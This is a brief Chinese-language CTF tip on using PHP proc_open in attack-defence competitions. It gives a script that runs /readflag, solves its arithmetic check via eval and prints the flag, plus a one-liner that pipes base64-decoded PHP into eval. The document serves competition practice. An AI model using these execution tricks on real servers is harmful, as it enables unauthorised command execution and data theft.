proc_open  
对已有工具的最大化利用。在打攻防的时候会派上一些用场

```php
$d = array(array("pipe", "r"),array("pipe", "w"),array("pipe", "w"));
$p = proc_open('/readflag', $d, $pipes, '/');
if (is_resource($p)) {
    fwrite($pipes[0], "y\n");fwrite($pipes[0], "y\n");
    fgets($pipes[1]);fgets($pipes[1]);
    $expression = fread($pipes[1], 21);
    $expression = 'return '.substr($expression, 15, 5).';';
    fwrite($pipes[0], eval($expression)."\n");
    echo stream_get_contents($pipes[1]);
}
```

```bash
echo base64(上面的) | base64 -d | php -r 'eval(stream_get_contents(STDIN));'
```